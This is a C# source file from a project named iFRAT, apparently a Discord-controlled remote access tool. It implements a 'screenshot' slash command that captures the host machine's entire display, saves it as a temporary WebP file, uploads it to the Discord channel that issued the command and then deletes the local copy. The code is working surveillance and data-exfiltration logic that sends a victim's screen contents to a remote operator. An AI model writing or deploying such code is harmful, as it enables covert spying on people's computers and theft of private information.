using System.Drawing;

using Discord;
using Discord.Interactions;
using Discord.Rest;
using Discord.WebSocket;
using Emgu.CV.Reg;

using iFRAT.Extensions;
using iFRAT.Extra;

using Masked.DiscordNet.Extensions;
using Spectre.Console;

namespace iFRAT.Commands;

#pragma warning disable MA0004 // Disable -> Use ConfigurateAwait(false); as no SyncCtx is needed.
/// <summary>
/// The Screenshot Command. Allows to take an image of what the screen has at the moment.
/// </summary>
public sealed class Screenshot : Masked.DiscordNet.IDiscordCommand
{
    public static Screenshot GlobalInstance { get; } = new();

    public async Task Run(SocketSlashCommand sockCommand)
    {
        await sockCommand.DeferAsync();
        var response = await sockCommand.FollowupAsync("Obtaining screnshot");


        var screenSize = ScreenHelpers.GetVirtualDisplaySize();
        _ = await response.ReplyAsync("Obtained Screen Size");
        Bitmap map = new(screenSize.Width, screenSize.Height);
        Graphics image = Graphics.FromImage(map as System.Drawing.Image);
        await response.ModifyAsync(x => x.Content = "Obtaining Screen pixels.");
        image.CopyFromScreen(0, 0, 0, 0, map.Size);

        string temporalPath = Path.GetTempFileName();
        image.Flush();

        await response.ModifyAsync(x => x.Content = "Saving Image.");
        map.Save(temporalPath, System.Drawing.Imaging.ImageFormat.Webp);
        File.Move(temporalPath, temporalPath + ".webp");

        await sockCommand.Channel.SendFileAsync(temporalPath + ".webp", "Screenshot Attached.");

        // Dispose of EVERYTHING.
        image.Dispose();
        map.Dispose();

        // Delete temporal file.
        File.Delete(temporalPath + ".webp");
    }

    public SlashCommandProperties Build()
    {
        return new SlashCommandBuilder
        {
            Name = "screenshot",
            Description = "Obtains an screenshot from the computer.",
        }.Build();
    }
}